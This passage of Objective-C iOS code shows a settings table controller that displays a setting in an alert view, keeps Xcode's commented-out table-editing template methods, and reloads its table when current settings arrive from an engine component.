		NSString *message = [NSString stringWithFormat:@"%@", row.mSettingValue];
		UIAlertView *alert = [[UIAlertView alloc] init];
		[alert setTitle:row.mSettingName];
		[alert setMessage:message];
		[alert setDelegate:self];
		[alert addButtonWithTitle:NSLocalizedString(@"kOkButtonTitle", @"")];
		NSArray *subViewArray = alert.subviews;
		for (int x = 1; x < [subViewArray count]; x++) { // 0 index is title label
			if([[[subViewArray objectAtIndex:x] class] isSubclassOfClass:[UILabel class]]) {
				UILabel *label = [subViewArray objectAtIndex:x];
				label.textAlignment = UITextAlignmentLeft;
			}
		}
		[alert show];
		[alert release];
	}
}



/*
 // Override to support conditional editing of the table view.
 - (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath {
 // Return NO if you do not want the specified item to be editable.
 return YES;
 }
 */


/*
 // Override to support editing the table view.
 - (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath {
 
 if (editingStyle == UITableViewCellEditingStyleDelete) {
 // Delete the row from the data source.
 [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
 }   
 else if (editingStyle == UITableViewCellEditingStyleInsert) {
 // Create a new instance of the appropriate class, insert it into the array, and add a new row to the table view.
 }   
 }
 */


/*
 // Override to support rearranging the table view.
 - (void)tableView:(UITableView *)tableView moveRowAtIndexPath:(NSIndexPath *)fromIndexPath toIndexPath:(NSIndexPath *)toIndexPath {
 }
 */


/*
 // Override to support conditional rearranging of the table view.
 - (BOOL)tableView:(UITableView *)tableView canMoveRowAtIndexPath:(NSIndexPath *)indexPath {
 // Return NO if you do not want the item to be re-orderable.
 return YES;
 }
 */

- (void) commandCompleted: (id) aCmdResponse toCommand: (NSInteger) aCmd {
	if (aCmd == kAppUI2EngineGetCurrentSettingsCmd) {
		DLog(@"%@", aCmdResponse);
		// Print the preferences initialized from the data sent by Engine side
		PreferencesData *initedPData = [[PreferencesData alloc] initWithData:aCmdResponse];
		[mSettings release];
		mSettings = [self getSettingsFromPreferencesData:initedPData];
		[mSettings retain];
		[initedPData release];
		[mTableView reloadData];
		DLog(@"---->End<----")
	}
}

@end
